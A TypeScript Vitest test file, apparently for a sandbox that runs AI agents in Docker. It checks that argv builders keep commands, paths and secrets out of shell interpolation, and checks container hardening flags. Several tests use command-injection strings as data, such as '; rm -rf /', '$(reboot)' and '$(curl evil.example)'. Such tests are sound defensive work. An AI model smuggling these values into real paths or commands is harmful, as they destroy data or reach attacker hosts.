import { describe, expect, it } from 'vitest'
import { spawn, spawnSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, readFileSync, existsSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  dockerExecArgv,
  dockerReadFileArgv,
  dockerWriteFileArgv,
  dockerListDirArgv,
  dockerPsArgv,
  dockerStartArgv,
  dockerBoxCreateArgv,
  dockerBoxChownArgv,
  dockerBoxMigrateArgv,
  dockerBoxMarkerCheckArgv,
  dockerBoxMarkerWriteArgv,
  dockerVolumeLsArgv,
  dockerStatSizeArgv,
  dockerClientEnv,
  dockerExecBackgroundArgv,
  dockerKillGroupArgv,
  dockerBoxInitCheckArgv,
  dockerBoxRmArgv,
  boxNeedsRecreateForInit,
  DOCKER_WRITE_SH,
  DOCKER_BOX_MIGRATE_SH,
  DOCKER_BG_WRAPPER_SH,
  BOX_CONTAINER,
  BOX_VOLUME,
  BOX_MOUNT,
  boxHomePath,
  DEFAULT_BOX_LIMITS
} from '../docker-argv'

describe('dockerExecArgv', () => {
  it('argv senza shell: exec -i -w <workdir> <container> sh -c <command>', () => {
    expect(dockerExecArgv('sandbot-box', 'echo hi', { workdir: '/box/home/agent_x' })).toEqual([
      'exec', '-i', '-w', '/box/home/agent_x', 'sandbot-box', 'sh', '-c', 'echo hi'
    ])
  })

  it('un comando con $(hostname) e backtick compare intatto come singolo elemento argv', () => {
    const nasty = 'echo $(hostname) `id -u` "$(whoami)"'
    const argv = dockerExecArgv('c', nasty)
    expect(argv[argv.length - 1]).toBe(nasty)
    // nessun elemento è stato splittato o interpretato: il payload appare UNA volta, come ultimo elemento
    expect(argv.filter((a) => a.includes('$(hostname)'))).toEqual([nasty])
    expect(argv).not.toContain('hostname') // $(hostname) non eseguito/spezzato a livello host
  })

  it('F2: HOME e le variabili NON segrete col VALORE nell\'argv; i segreti col solo NOME', () => {
    const argv = dockerExecArgv('c', 'curl -H $SANDBOT_SECRET_API_KEY', { env: { HOME: '/box/home/x', SANDBOT_SECRET_API_KEY: 'SK-1234-SEGRETO' } })
    const i = argv.indexOf('-e')
    expect(argv[i + 1]).toBe('HOME=/box/home/x')
    expect(argv[i + 3]).toBe('SANDBOT_SECRET_API_KEY') // solo il nome: il valore MAI in argv
    expect(argv.join(' ')).not.toContain('SK-1234-SEGRETO')
  })

  it('F2: l\'env del processo docker sull\'HOST ha il daemon + i SOLI segreti (niente HOME del bot)', () => {
    const env = dockerClientEnv({ HOME: '/box/home/x', PATH: '/usr/bin', SANDBOT_SECRET_API_KEY: 'v' })
    expect(Object.keys(env)).toEqual(['SANDBOT_SECRET_API_KEY'])
    // il client docker usa la SUA HOME per ~/.docker (contesti, socket)
    expect(env.HOME).toBeUndefined()
  })
})

describe('operazioni file: path e contenuto mai interpolati in shell', () => {
  it('read: path (anche con spazi/metacaratteri) è un singolo argomento di cat', () => {
    const path = 'a b; rm -rf / # $(touch pwned)'
    expect(dockerReadFileArgv('c', path)).toEqual(['exec', '-i', '-w', BOX_MOUNT, 'c', 'cat', '--', path])
  })

  it('write: sh -c costante, path come argomento posizionale, contenuto NON in argv, scrittura ATOMICA', () => {
    const argv = dockerWriteFileArgv('c', '/box/home/x; $(reboot)`y`')
    expect(argv).toEqual(['exec', '-i', '-w', BOX_MOUNT, 'c', 'sh', '-c', DOCKER_WRITE_SH, 'sh', '/box/home/x; $(reboot)`y`'])
    // lo script è fisso: crea la dir del file, scrive lo stdin su un TEMPORANEO
    // NELLA STESSA cartella e poi rinomina (fase 11: un altro bot non legge a metà)
    expect(DOCKER_WRITE_SH).toBe('mkdir -p "$(dirname "$1")" && cat > "$1.sandbot-tmp" && mv -f "$1.sandbot-tmp" "$1"')
  })

  it('list: ls -la con path come argv', () => {
    expect(dockerListDirArgv('c', '.')).toEqual(['exec', '-i', '-w', BOX_MOUNT, 'c', 'ls', '-la', '--', '.'])
  })
})

describe('lifecycle & hardening del box condiviso (§5.2 + fase 11 punto 1)', () => {
  it('ps: filtro nome esatto ancorato, senza grep', () => {
    expect(dockerPsArgv(BOX_CONTAINER)).toEqual([
      'ps', '-a', '--format', '{{.Names}}', '--filter', 'name=^/sandbot-box$'
    ])
  })

  it('start: argv diretto', () => {
    expect(dockerStartArgv('c')).toEqual(['start', 'c'])
  })

  it('create: container UNICO sandbot-box, volume sandbot-box su /box, hardening e limiti condivisi configurabili', () => {
    const argv = dockerBoxCreateArgv(BOX_CONTAINER, BOX_VOLUME, 'bridge', DEFAULT_BOX_LIMITS)
    for (const flag of ['--user', '--cap-drop', '--security-opt', '--init', '--pids-limit', '--memory', '--cpus', '--network']) {
      expect(argv).toContain(flag)
    }
    const val = (flag: string) => argv[argv.indexOf(flag) + 1]
    expect(argv[argv.indexOf('--name') + 1]).toBe('sandbot-box')
    expect(argv).toContain(`${BOX_VOLUME}:${BOX_MOUNT}`)
    expect(val('--user')).toBe('1000:1000')
    expect(val('--cap-drop')).toBe('ALL')
    expect(val('--security-opt')).toBe('no-new-privileges')
    // punto 1: limiti condivisi e configurabili — memoria 4g, cpu 2, pids 1024
    expect(val('--pids-limit')).toBe('1024')
    expect(val('--memory')).toBe('4g')
    expect(val('--cpus')).toBe('2')
    expect(val('--network')).toBe('bridge')
    // limiti passati dal chiamante (settings sandbox.*)
    const custom = dockerBoxCreateArgv('c', 'v', 'none', { memory: '2g', cpus: 1, pids: 512 })
    const v2 = (f: string) => custom[custom.indexOf(f) + 1]
    expect(v2('--memory')).toBe('2g')
    expect(v2('--cpus')).toBe('1')
    expect(v2('--pids-limit')).toBe('512')
    expect(v2('--network')).toBe('none')
  })

  it('init volume: one-shot chown del box condiviso montato su /box', () => {
    expect(dockerBoxChownArgv(BOX_VOLUME)).toEqual(['run', '--rm', '-v', 'sandbot-box:/box', 'ubuntu:24.04', 'chown', '-R', '1000:1000', '/box'])
  })

  it('la home di un bot dentro il box condiviso', () => {
    expect(boxHomePath('agent_x')).toBe('/box/home/agent_x')
  })
})

describe('migrazione docker una tantum (punto 1): argv puri, copia senza cancellare', () => {
  it('esistenza del vecchio volume: filtro nome esatto', () => {
    expect(dockerVolumeLsArgv('sandbot-agent_x-box')).toEqual([
      'volume', 'ls', '--format', '{{.Name}}', '--filter', 'name=^/sandbot-agent_x-box$'
    ])
  })

  it('copia one-shot: sh -c COSTANTE, agentId come $1, vecchio volume in sola lettura', () => {
    const argv = dockerBoxMigrateArgv('sandbot-agent_x-box', 'agent_x')
    expect(argv).toEqual([
      'run', '--rm',
      '-v', 'sandbot-agent_x-box:/from:ro',
      '-v', 'sandbot-box:/box',
      'ubuntu:24.04', 'sh', '-c', DOCKER_BOX_MIGRATE_SH, 'sh', 'agent_x'
    ])
    // lo script è fisso: copia dentro la home del bot, NON cancella l'origine
    expect(DOCKER_BOX_MIGRATE_SH).toBe('mkdir -p "/box/home/$1" && cp -a /from/. "/box/home/$1/"')
    expect(DOCKER_BOX_MIGRATE_SH).not.toContain('rm ')
  })

  it('marker dell\'idempotenza: test e touch dentro il volume del box', () => {
    expect(dockerBoxMarkerCheckArgv()).toEqual(['run', '--rm', '-v', 'sandbot-box:/box', 'ubuntu:24.04', 'test', '-f', '/box/.migrated-v1'])
    expect(dockerBoxMarkerWriteArgv()).toEqual(['run', '--rm', '-v', 'sandbot-box:/box', 'ubuntu:24.04', 'touch', '/box/.migrated-v1'])
  })
})

// ---- F1: il wrapper COSTANTE del background, eseguito col VERO /bin/sh ----

/**
 * Il wrapper è una stringa costante: questi test la eseguono davvero con
 * /bin/sh su una directory temporanea (niente Docker). Su macOS non esiste
 * setsid: il wrapper prende il ramo senza setsid (il gruppo è quello del
 * wrapper, che in host nasce già detached) — il test del kill di gruppo resta
 * valido proprio su quel ramo; su Linux coprirebbe anche il ramo setsid.
 */
describe('DOCKER_BG_WRAPPER_SH col vero /bin/sh (F1)', () => {
  const runWrapper = (cwd: string, command: string, log: string, exit: string, pid: string) =>
    spawnSync('/bin/sh', ['-c', DOCKER_BG_WRAPPER_SH, 'sh', command, log, exit, pid], { cwd, encoding: 'utf8' })

  it('un comando con spazi e && : gira con sh -c, scrive log ed exit 0, e CREA la cartella dei file', () => {
    const tmp = mkdtempSync(join(tmpdir(), 'sandbot-wrap-'))
    try {
      // la cartella .sandbot/shells NON esiste: la crea il wrapper
      const r = runWrapper(tmp, 'echo "parte 1" && echo "parte 2"', '.sandbot/shells/sh-t.log', '.sandbot/shells/sh-t.exit', '.sandbot/shells/sh-t.pid')
      expect(r.status).toBe(0)
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-t.log'), 'utf8')).toBe('parte 1\nparte 2\n')
      // echo scrive con il newline: i lettori (tick, await_shell) fanno trim
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-t.exit'), 'utf8').trim()).toBe('0')
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-t.pid'), 'utf8').trim()).toMatch(/^\d+$/)
      expect(existsSync(join(tmp, '.sandbot/shells'))).toBe(true)
    } finally {
      rmSync(tmp, { recursive: true, force: true })
    }
  })

  it('un exit 3 scrive 3 nel file dell\'exit code', () => {
    const tmp = mkdtempSync(join(tmpdir(), 'sandbot-wrap-'))
    try {
      const r = runWrapper(tmp, 'echo boom >&2; exit 3', '.sandbot/shells/sh-e.log', '.sandbot/shells/sh-e.exit', '.sandbot/shells/sh-e.pid')
      expect(r.status).toBe(0) // il wrapper finisce bene: è il COMANDO che è fallito
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-e.exit'), 'utf8').trim()).toBe('3')
      expect(readFileSync(join(tmp, '.sandbot/shells/sh-e.log'), 'utf8')).toContain('boom')
    } finally {
      rmSync(tmp, { recursive: true, force: true })
    }
  })

  it('il pid scritto è quello del GRUPPO: kill -TERM -- -<pgid> termina anche i FIGLI', async () => {
    const tmp = mkdtempSync(join(tmpdir(), 'sandbot-wrap-'))
    try {
      // detached: il wrapper è un gruppo suo; il comando (sleep 30 & wait) ha
      // un FIGLIO che deve morire col gruppo, non solo la shell
      const child = spawn('/bin/sh', ['-c', DOCKER_BG_WRAPPER_SH, 'sh', 'sleep 30 & wait', '.sandbot/shells/sh-k.log', '.sandbot/shells/sh-k.exit', '.sandbot/shells/sh-k.pid'], {
        cwd: tmp,
        detached: true,
        stdio: 'ignore'
      })
      child.unref()
      const pidFile = join(tmp, '.sandbot/shells/sh-k.pid')
      let pgid = 0
      for (let i = 0; i < 40 && !pgid; i++) {
        try { pgid = Number(readFileSync(pidFile, 'utf8').trim()) } catch { await new Promise((r) => setTimeout(r, 100)) }
      }
      expect(pgid).toBeGreaterThan(0)
      // come il wrapper docker: TERM all'INTERO gruppo (pid negativo)
      process.kill(-pgid, 'SIGTERM')
      // il gruppo muore: shell E figlio (pieno di grazia, poi si controlla)
      let dead = false
      for (let i = 0; i < 50 && !dead; i++) {
        try { process.kill(-pgid, 0) } catch { dead = true }
        if (!dead) await new Promise((r) => setTimeout(r, 100))
      }
      expect(dead).toBe(true)
      // il wrapper ucciso NON ha scritto l'exit file (nessuna chiusura spuria)
      expect(existsSync(join(tmp, '.sandbot/shells/sh-k.exit'))).toBe(false)
    } finally {
      rmSync(tmp, { recursive: true, force: true })
    }
  })

  it('la forma del wrapper è quella attesa (sh -c, mkdir, gruppo proprio, pid e exit file)', () => {
    expect(DOCKER_BG_WRAPPER_SH).toContain('mkdir -p "$(dirname "$2")"')
    expect(DOCKER_BG_WRAPPER_SH).toContain('sh -c "$1"')
    expect(DOCKER_BG_WRAPPER_SH).toContain('setsid')
    expect(DOCKER_BG_WRAPPER_SH).toContain('echo "$?" >"$3"')
  })

  it('exec -d col wrapper: comando e path come argomenti posizionali, HOME col valore in argv (F2)', () => {
    const argv = dockerExecBackgroundArgv('sandbot-box', 'npm run build', { workdir: '/box/home/x', env: { HOME: '/box/home/x', SANDBOT_SECRET_K: 'SEGRETO' } }, { log: '.sandbot/shells/sh-1.log', exit: '.sandbot/shells/sh-1.exit', pid: '.sandbot/shells/sh-1.pid' })
    expect(argv).toEqual([
      'exec', '-d', '-w', '/box/home/x',
      '-e', 'HOME=/box/home/x',
      '-e', 'SANDBOT_SECRET_K',
      'sandbot-box', 'sh', '-c', DOCKER_BG_WRAPPER_SH, 'sh', 'npm run build',
      '.sandbot/shells/sh-1.log', '.sandbot/shells/sh-1.exit', '.sandbot/shells/sh-1.pid'
    ])
    expect(argv.join(' ')).not.toContain('SEGRETO')
  })

  it('kill nel container (G1): ARGV PURI al kill di procps — TERM, KILL e il segnale 0 di esistenza, tutti al GRUPPO', () => {
    // niente `sh -c`: il kill INTERNO di dash non accetta `--` (Illegal number: -)
    expect(dockerKillGroupArgv('sandbot-box', 15, 'TERM')).toEqual(['exec', 'sandbot-box', 'kill', '-TERM', '--', '-15'])
    expect(dockerKillGroupArgv('sandbot-box', 15, 'KILL')).toEqual(['exec', 'sandbot-box', 'kill', '-KILL', '--', '-15'])
    expect(dockerKillGroupArgv('sandbot-box', 15, '0')).toEqual(['exec', 'sandbot-box', 'kill', '-0', '--', '-15'])
    for (const argv of [dockerKillGroupArgv('sandbot-box', 15, 'TERM'), dockerKillGroupArgv('sandbot-box', 15, '0')]) {
      expect(argv).not.toContain('sh')
      expect(argv).not.toContain('-c')
    }
  })
})

// ---- G2: --init (tini raccoglie gli zombie) e la ricreazione del container vecchio ----

describe('G2: init del container e migrazione senza toccare il volume', () => {
  it('inspect dell\'init: argv puro, formato fisso true/false', () => {
    expect(dockerBoxInitCheckArgv(BOX_CONTAINER)).toEqual(['inspect', '-f', '{{.HostConfig.Init}}', 'sandbot-box'])
  })

  it('rimozione per la ricreazione: SOLO il container, il volume mai nominato', () => {
    const argv = dockerBoxRmArgv(BOX_CONTAINER)
    expect(argv).toEqual(['rm', '-f', 'sandbot-box'])
    expect(argv.join(' ')).not.toContain('volume')
  })

  it('decisione pura ricreare sì/no: solo un "false" esplicito ricrea', () => {
    expect(boxNeedsRecreateForInit('false')).toBe(true)
    expect(boxNeedsRecreateForInit('false\n')).toBe(true) // docker inspect chiude a capo
    expect(boxNeedsRecreateForInit('true')).toBe(false)
    expect(boxNeedsRecreateForInit('true\n')).toBe(false)
    // inspect fallito o output inatteso: si tiene il container che funziona
    for (const weird of ['', '\n', 'Error: No such object', 'False']) {
      expect(boxNeedsRecreateForInit(weird), JSON.stringify(weird)).toBe(false)
    }
  })
})

describe('dimensione di un file nel box: argv PURI (F6)', () => {
  it('stat -c %s col path come SINGOLO argomento: $(…) e backtick non eseguono nulla', () => {
    const path = '/box/home/x/$(curl evil.example)`reboot`'
    const argv = dockerStatSizeArgv('sandbot-box', path)
    expect(argv).toEqual(['exec', '-i', '-w', BOX_MOUNT, 'sandbot-box', 'stat', '-c', '%s', '--', path])
    // niente shell nel mezzo: il path resta UN elemento argv
    expect(argv[argv.length - 1]).toBe(path)
    expect(argv).not.toContain('sh')
  })
})
